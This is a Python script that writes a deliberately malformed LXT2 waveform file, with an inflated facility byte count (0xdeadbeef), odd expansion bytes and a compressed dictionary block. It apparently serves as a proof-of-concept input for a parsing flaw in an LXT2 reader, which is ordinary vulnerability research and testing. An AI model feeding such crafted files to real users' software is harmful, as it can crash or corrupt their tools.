import gzip
import struct

output = b''

#####

# names
fac_names = b''

fac_names += struct.pack(">H", 0)   # offset
fac_names += b'test\x00'

#####

# geometry
fac_geom = b''

fac_geom += struct.pack(">IIII", 0, 0xffffffff, 0xffffffff, 0)

#####

# header
output += struct.pack('>H', 0x1380)     # hdrid
output += struct.pack('>H', 0x0001)     # version
output += struct.pack('>B', 64)         # granule size

output += struct.pack(">I", 0)              # numfacs (old)

output += struct.pack(">I", 11)             # num_expansion_bytes
output += struct.pack(">I", 1)              # numfacs (actual)
output += struct.pack(">q", -1000)          # timezero
output += b'lol'

output += struct.pack(">I", 0xdeadbeef)     # numfacbytes
output += struct.pack(">I", 100)            # longestname
output += struct.pack(">I", len(fac_names)) # zfacnamesize
output += struct.pack(">I", len(fac_names)) # zfacname_predec_size
output += struct.pack(">I", len(fac_geom))  # zfacgeometrysize
output += struct.pack(">b", -9)             # timescale

output += fac_names
output += fac_geom

#####

# block
block_data = b''
block_data += b'\x01'                   # LXT2_RD_GRAN_SECT_DICT
block_data += struct.pack(">I", 0)      # num_dict_entries
block_data += struct.pack(">I", 0)      # dict_size
block_data += struct.pack(">I", 0)      # num_map_entries

# it is not actually possible to not compress this
# or else it will be read as a striped file
block_compr = gzip.compress(block_data)

output += struct.pack(">IIQQ",
                      len(block_data),  # uncompressed size
                      len(block_compr), # compressed size
                      0,                # start time
                      100)              # end time
output += block_compr

#####

with open('expansion.lxt2', 'wb') as f:
    f.write(output)
